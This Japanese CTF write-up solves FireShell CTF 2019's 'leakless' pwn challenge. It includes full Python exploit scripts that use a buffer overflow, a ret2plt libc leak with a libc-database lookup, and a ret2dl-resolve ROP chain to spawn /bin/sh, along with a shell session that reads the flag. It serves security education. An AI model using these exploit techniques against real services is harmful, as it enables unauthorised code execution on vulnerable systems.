# [pwn 60pts] leakless - FireShell CTF 2019
昔学校でこの問題を取り上げて勉強会もしたので、その際の資料およびdocker環境も参考にどうぞ：

[https://bitbucket.org/ptr-yudai/ocamlabctf/src/master/10th/](https://bitbucket.org/ptr-yudai/ocamlabctf/src/master/10th/)

32ビットバイナリです。
```
$ checksec leakless
[*] 'leakless'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```

バッファオーバーフローがあるだけというシンプルな構成ですが、libcが配布されていません。
ということで、まずは普通に解いてみます。

## libc databaseを用いた解法
SSPは無効なので単にリターンアドレスを書き換えれば任意のアドレスへジャンプできます。
```python
from ptrlib import *

sock = Process("./leakless")

payload = b"A" * 0x4c
payload += b"B" * 4
sock.send(payload)

sock.interactive()
```
dmesgで結果を確認しましょう。
```
[ 3066.166850] leakless[10728]: segfault at 42424242 ip 0000000042424242 sp 00000000ff909f00 error 14
```
目標は`system('/bin/sh')`を呼び出すことですが、そのためにはlibcのロードアドレスと、libcそのものが必要になります。（systemはGOTに存在しないため。）

GOTを見てみましょう。
```
$ readelf -r leakless

再配置セクション '.rel.dyn' (オフセット 0x33c) は 3 個のエントリから構成されています:
 オフセット 情報    型              シンボル値 シンボル名
08049ff4  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000806 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000a06 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

再配置セクション '.rel.plt' (オフセット 0x354) は 7 個のエントリから構成されています:
 オフセット 情報    型              シンボル値 シンボル名
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   signal@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a020  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a024  00000907 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0
```
簡単に説明すると、GOTに登録されている関数が一度呼び出されると、その関数のメモリ上での実際のアドレスが書き込まれます。
実際にバイナリはPLTと呼ばれる領域をcallするのですが、PLTで関数の名前を解決します。
そのため、一度も呼び出されていない関数のGOTには名前解決用のPLT領域のアドレスが書き込まれているので注意してください。

ということで、ret2pltで例えば`puts(read@got)`を呼び出せば`read`関数のアドレスが分かります。
この要領で2つの関数のアドレスを読み出してみましょう。
```python
from ptrlib import *

sock = Socket("localhost", 2002)
elf = ELF("./leakless")

plt_puts = 0x080483f0
rop_pop_ebx = 0x080483ad

payload = b"A" * 0x4c
payload += p32(plt_puts)
payload += p32(rop_pop_ebx)
payload += p32(elf.got("read"))
payload += p32(plt_puts)
payload += p32(rop_pop_ebx)
payload += p32(elf.got("signal"))
sock.send(payload)

addr_read = u32(sock.recvline()[:4])
addr_signal = u32(sock.recvline()[:4])
print(hex(addr_read))
print(hex(addr_signal))

sock.close()
```
こんな感じで`read`と`signal`のアドレスが取得できました。
```
$ python solve1.py
[+] Socket: Successfully connected to localhost:2002
0xf760b180
0xf75536d0
[+] close: Connection to localhost:2002 closed
```

これを元にlibc databseから、使われているlibcのバージョンを特定します。

[https://libc.blukat.me/](https://libc.blukat.me/)

今回は`libc6_2.26-0ubuntu2.1_i386`がヒットしました。
ということでこれをダウンロードして、あとは`system('/bin/sh')`を実行しましょう。

```python
from ptrlib import *

sock = Socket("localhost", 2002)
elf = ELF("./leakless")
libc = ELF("./libc6_2.26-0ubuntu2.1_i386.so")

plt_puts = 0x080483f0
rop_pop_ebx = 0x080483ad

payload = b"A" * 0x4c
payload += p32(plt_puts)
payload += p32(rop_pop_ebx)
payload += p32(elf.got("read"))
payload += p32(elf.symbol('feedme'))
sock.send(payload)

addr_read = u32(sock.recvline()[:4])
libc_base = addr_read - libc.symbol("read")
addr_system = libc_base + libc.symbol("system")
addr_binsh  = libc_base + next(libc.find("/bin/sh"))
addr_exit   = libc_base + libc.symbol("exit")
dump("<read> = " + hex(addr_read))
dump("libc base = " + hex(libc_base))

payload = b"A" * 0x4c
payload += p32(addr_system)
payload += p32(rop_pop_ebx)
payload += p32(addr_binsh)
payload += p32(addr_exit)
sock.send(payload)

sock.interactive()
```

```
$ python solve1.py
[+] Socket: Successfully connected to localhost:2002
[ptrlib] <read> = 0xf75e8180
[ptrlib] libc base = 0xf7503000
[ptrlib]$ ls
flag.txt
leakless
leakless.sh
[ptrlib]$ cat flag.txt
F#{y3ah!!_y0u_d1d_1t!_C0ngr4tz}
[ptrlib]$ 
```

## ret2dl-resolveを用いた解法
libc databaseに登録されているのは基本的にubuntuのlibcで、サーバーがCentOSだったりlibcが自分でビルドしたものだったりすると対応できません。
ret2dl-resolveを使うと、そのような厳しい条件でも今回の問題を解くことができます。
libc関数の初回呼び出し時にPLTにジャンプした際、`_dl_runtime_resolve`という関数が呼び出されます。（実際にはアセンブリとして定義されています。）
さらにそいつが`_dl_fixup`関数を呼び出して名前解決してアドレスに変換してくれます。

この機構を利用するのがret2dl-resolveです。
`read`関数のpltを見てみましょう。
```
080483b0 <.plt>:
 80483b0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004
 80483b6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008
...
080483c0 <read@plt>:
 80483c0:       ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
 80483c6:       68 00 00 00 00          push   0x0
 80483cb:       e9 e0 ff ff ff          jmp    80483b0 <.plt>
```
初回呼び出し時は0x804a00c(read@got)に0x80483c6が入っているので`push 0x0`から始まります。
ここでpushされている値は.rel.pltからの相対位置(`reloc_offset`)です。
`_dl_fixup`関数はこの引数`reloc_offset`から`ELF32_Rel`構造体の`reloc`変数にポインタを入れます。
```c
const PLTREL *const reloc = (const void *)
  (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
```
`ELF32_Rel`構造体は次のように定義されています。
```c
typedef uint32_t Elf32_Word;
typedef uint32_t Elf32_Addr;
typedef uint16_t Elf32_Section;

typedef struct
{
  Elf32_Addr r_offset;
  Elf32_Word r_info;
} Elf32_Rel;

#define ELF32_R_SYM(val)  ((val) >> 8)
#define ELF32_R_TYPE(val) ((val) & 0xff)
```
実際には次のような値が入っています。
```
gdb-peda$ x/2wx 0x08048354 + 0x0
0x8048354: 0x0804a00c 0x00000107
```
0x8048354が.rel.pltのアドレスで、0x0はpushされた値です。
`reloc->r_info`は0x107となっていますね。
さらにこの値から.dynsymセクションが参照されます。
```c
const ElfW(Sym) *sym =
  &symtab[ELFW(R_SYM)(reloc->r_info)];
```
ここで`ELFW(R_SYM)(reloc->r_info)`は要するに`reloc->r_info >> 8`という意味ですが、0x107の7はSanity Checkを通過するために必要となるので注意してください。
```c
assert (
  ELFW(R_TYPE)(reloc->r_info)==ELF_MACHINE_JMP_SLOT
);
```
さらに.dynstrセクションから`st_name`の文字列が参照されます。
```c
result = _dl_lookup_symbol_x(
  strtab + sym->st_name, l, &sym, l→l_scope,
  version, ELF_RTYPE_CLASS_PLT, flags, NULL
);
```
そして解決されたアドレスは`reloc->r_offset`のアドレスに書き込まれます。

したがって、ROP Stagerで各種構造体をメモリ上に作り、結果を適当な関数のGOTに書き込んで、最後にその関数のPLTを呼び出してやれば任意のlibc関数が呼び出せます。

なかなか大変なので昔作ったexploitコードを載せておきます。
```python
from pwn import *

elf = ELF("./leakless")
sock = remote("localhost", 2000)
_ = raw_input()

addr_plt = 0x080483b0
rop_pop3 = 0x08048699
rop_pop_ebp = 0x0804869b
rop_leave = 0x080484a5

addr_relplt = 0x08048354
addr_dynsym = 0x080481cc
addr_dynstr = 0x0804828c
addr_bss    = 0x0804a030

fname = "system" + "\x00"
farg  = "/bin/sh" + "\x00"
base_stage = addr_bss + 0x800
addr_reloc = addr_bss + 0xa00
addr_sym = addr_bss + 0xa80 | (addr_dynsym & 0xF)
addr_str = addr_bss
addr_arg = addr_str + len(fname)

""" Elf32_Rel """
reloc = p32(elf.got['exit'])
reloc += p32((((addr_sym - addr_dynsym) / 0x10) << 8) | 7)
""" Elf32_Sym """
sym = p32(addr_str - addr_dynstr)
sym += p32(0)
sym += p32(0)
sym += p32(0x12)

def craft_read(addr, size):
    payload = p32(elf.plt['read']) ## read(stdin, addr, size)
    payload += p32(rop_pop3)
    payload += p32(0)    # fd
    payload += p32(addr) # buf
    payload += p32(size) # size
    return payload

""" Stage 1 """
payload1 = "A" * 0x4c
payload1 += craft_read(base_stage, 0x80)
payload1 += craft_read(addr_reloc, 0x8)
payload1 += craft_read(addr_sym, 0x10)
payload1 += craft_read(addr_str, len(fname))
payload1 += craft_read(addr_arg, len(farg))
payload1 += p32(rop_pop_ebp) ## esp = base_stage
payload1 += p32(base_stage)
payload1 += p32(rop_leave)
payload1 += "A" * (0x100 - len(payload1))

""" Stage 2 """
reloc_offset = addr_reloc - addr_relplt
payload2 = "AAAA"
payload2 += p32(addr_plt)
payload2 += p32(reloc_offset) # orig: push 0x0
payload2 += "XXXX"
payload2 += p32(addr_arg)
payload2 += "A" * (0x80 - len(payload2))

sock.send(payload1)
sock.send(payload2)
sock.send(reloc)
sock.send(sym)
sock.send(fname)
sock.send(farg)
sock.interactive()
```

# 感想
問題自体はかなり易しいです。
当時の私は恥ずかしいことにlibc databaseを知らなかったので解けませんでした。
まぁ解けなかったおかげで堀り下げて勉強してret2dl-resolveも知れたので良かったかな。
